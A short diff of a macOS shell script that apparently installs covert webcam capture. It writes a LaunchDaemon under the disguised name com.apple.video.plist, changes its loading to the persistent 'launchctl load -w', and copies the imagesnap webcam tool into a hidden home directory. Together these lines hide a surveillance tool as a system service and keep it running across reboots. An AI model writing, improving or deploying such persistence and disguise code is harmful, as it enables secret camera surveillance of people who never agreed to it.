@@ -37,7 +37,7 @@ echo '
 ' > /Library/LaunchDaemons/com.apple.video.plist
 
 #Load the LaunchAgent
-launchctl load /Library/LaunchDaemons/com.apple.video.plist
+launchctl load -w /Library/LaunchDaemons/com.apple.video.plist
 
 #Copy imagesnap to the hidden directory
 cp imagesnap $HOME/.hidden
